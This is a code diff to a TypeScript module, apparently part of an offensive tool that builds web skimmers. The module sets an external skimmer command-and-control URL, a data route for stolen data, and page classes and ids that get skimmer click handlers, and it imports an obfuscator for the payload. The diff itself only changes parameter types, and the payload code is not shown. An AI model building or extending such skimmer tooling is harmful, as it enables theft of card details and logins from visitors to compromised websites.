@@ -2,7 +2,7 @@ import * as fs from "fs";
 import { obfuscate, ObfuscationResult } from "javascript-obfuscator";
 
 import { Constants, emsg } from "../utils/utils";
-import BaseModule from "./base";
+import BaseModule, { ExecuteReturn } from "./base";
 
 const MODULE_DESCRIPTION = "manage the skimmer configuration";
 
@@ -51,24 +51,24 @@ export default class SkimmerModule extends BaseModule {
                 arguments: ["<url>"],
                 description: "set the external skimmer c2 url (http://skimmer.url)",
                 validateRegex: Constants.VALID_URL_REGEX,
-                execute: (params: string[]) => {
-                    this.config.url = params[0];
+                execute: (params: string) => {
+                    this.config.url = params;
                 },
             },
             "set data_route": {
                 arguments: ["<route>"],
                 description: "set the skimmer url data route (/stats)",
                 validateRegex: Constants.VALID_ROUTE_REGEX,
-                execute: (params: string[]) => {
-                    this.config.data_route = params[0];
+                execute: (params: string) => {
+                    this.config.data_route = params;
                 },
             },
             "set target_classes": {
                 arguments: ["<class 1,class 2,class 3>"],
                 description: "(optional) target classes with skimmer click handler, separated by comma",
                 validateRegex: Constants.VALID_CLASS_ID_REGEX,
-                execute: (params: string[]) => {
-                    const classes = params[0].split(",");
+                execute: (params: string) => {
+                    const classes = params.split(",");
                     this.config.target_classes = [...new Set(classes)];
                 },
             },
@@ -76,8 +76,8 @@ export default class SkimmerModule extends BaseModule {
                 arguments: ["<id 1,id 2,id 3>"],
                 description: "(optional) target ids with skimmer click handler, separated by comma",
                 validateRegex: Constants.VALID_CLASS_ID_REGEX,
-                execute: (params: string[]) => {
-                    const ids = params[0].split(",");
+                execute: (params: string) => {
+                    const ids = params.split(",");
                     this.config.target_ids = [...new Set(ids)];
                 },
             },
@@ -86,7 +86,7 @@ export default class SkimmerModule extends BaseModule {
         this.payload = "";
     }
 
-    run(params?: string[]) {
+    run(params?: string[]): ExecuteReturn {
         if (!this.config.url) throw new Error(`skimmer url is required, see 'help'`);
 
         let data: Buffer;
